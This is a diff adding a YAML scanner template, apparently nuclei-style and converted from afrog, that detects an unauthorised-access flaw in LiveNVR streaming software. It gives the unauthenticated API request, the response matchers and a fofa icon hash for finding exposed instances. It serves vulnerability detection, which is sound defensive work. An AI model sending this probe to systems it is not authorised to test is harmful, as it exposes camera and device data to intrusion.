@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - code
+          - customName
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/api/v1/device/channeltree?serial=&pcode'
+id: livenvr-channeltree-fileread
+info:
+  author: avic123
+  description: |-
+    LiveNVR流媒体服务软件接口存在未授权访问漏洞
+    fofa: icon_hash="-206100324"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: LiveNVR流媒体服务软件接口存在未授权访问漏洞
+  severity: high
+  tags: livenvr,fileread,argus-import
